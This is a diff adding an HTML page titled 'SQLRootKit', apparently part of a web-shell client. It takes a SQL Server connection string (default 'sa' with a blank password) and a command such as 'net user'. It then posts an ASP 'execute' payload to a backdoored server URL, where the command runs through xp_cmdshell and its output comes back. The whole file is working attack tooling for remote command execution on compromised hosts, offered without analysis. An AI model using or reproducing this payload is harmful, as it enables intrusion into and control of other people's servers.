@@ -1,0 +1,23 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">SQLRootKit</div>
+<form name="xform" method="post" target="_blank">
+<table width="100%"  border="0" align="center">
+<tr>
+<td width="11%">Connection Str:</td>
+<td width="89%"><input name="conn" type="text" value="Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=;" size="80"></td>
+</tr>
+<tr>
+<td width="11%">Command:</td>
+<td width="89%"><input name="cmd" type="text" value="net user" size="40"></td>
+</tr>
+<input type="hidden" name="code" value=''>
+</table>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.value='execute("response.clear:set adoConn=Server.CreateObject(""ADODB.Connection""):adoConn.Open request.Form(""conn""):strQuery=""exec master.dbo.xp_cmdshell \'""&request.form(""cmd"")&""\'"":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult=strResult&chr(13)&recResult(0):recResult.MoveNext:Loop:set recResult=Nothing:strResult=Replace(strResult,""<"",""&lt;""):strResult=Replace(strResult,"">"",""&gt;""):response.write(""<pre>""&strResult&""</pre>""):set adoConn=Nothing:response.end")'
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
